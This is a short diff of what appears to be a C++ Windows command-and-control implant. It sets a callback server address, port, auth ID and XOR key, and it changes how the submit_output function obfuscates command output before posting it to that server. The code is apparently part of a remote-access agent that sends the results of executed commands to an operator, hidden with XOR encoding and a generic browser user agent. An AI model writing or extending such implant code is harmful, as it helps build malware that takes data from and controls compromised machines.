@@ -17,10 +17,10 @@
 
 #pragma comment(lib, "winhttp.lib")
 
-const std::string SERVER_IP = "127.0.0.0";
+const std::string SERVER_IP = "192.168.1.107";
 const int SERVER_PORT = 443;
-const std::string AUTH_ID = "03c5cbb4-db45-4777-b716-f276d1a9fde3";
-const int XOR_KEY = 205;
+const std::string AUTH_ID = "2f729677-ce36-4c3f-a1fc-6433278ad37b";
+const int XOR_KEY = 11;
 const bool STATUS_BASE64 = false;
 
 const std::string DEFAULT_USER_AGENT = "Mozilla/5.0";
@@ -580,11 +580,8 @@ void submit_output(const std::string& output, std::mt19937& gen) {
         return;
     }
     
-    std::string final_output = PREPEND_OUTPUT + 
-                              (output.empty() ? "[no output]" : output) + 
-                              APPEND_OUTPUT;
-    
-    std::string encrypted_output = xor_encrypt_decrypt_string(final_output, XOR_KEY);
+    std::string encrypted_output = xor_encrypt_decrypt_string(output, XOR_KEY);
+    std::string final_output = PREPEND_OUTPUT + encrypted_output + APPEND_OUTPUT;
     
     std::string payload = "{\"action\":\"submit\",\"session_id\":\"" + 
                          xor_encrypt_decrypt_string(session_id, XOR_KEY) + 
